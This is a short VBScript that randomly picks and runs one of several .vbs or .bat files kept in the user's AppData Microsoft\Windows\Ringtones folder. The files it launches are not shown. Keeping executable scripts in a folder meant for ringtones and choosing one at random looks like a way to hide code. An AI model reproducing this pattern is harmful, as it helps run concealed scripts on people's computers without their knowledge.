Dim max,min
max=4
min=1
Randomize
Datei=Int((max-min+1)*Rnd+min)
Set wshShell = wscript.CreateObject("WScript.Shell")
Dat= "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones\" & Datei & ".vbs"
if Datei = 4 then
Dat= "%systemdrive%\users\%username%\AppData\Roaming\Microsoft\Windows\Ringtones\1.bat"
end if
wshShell.run Dat
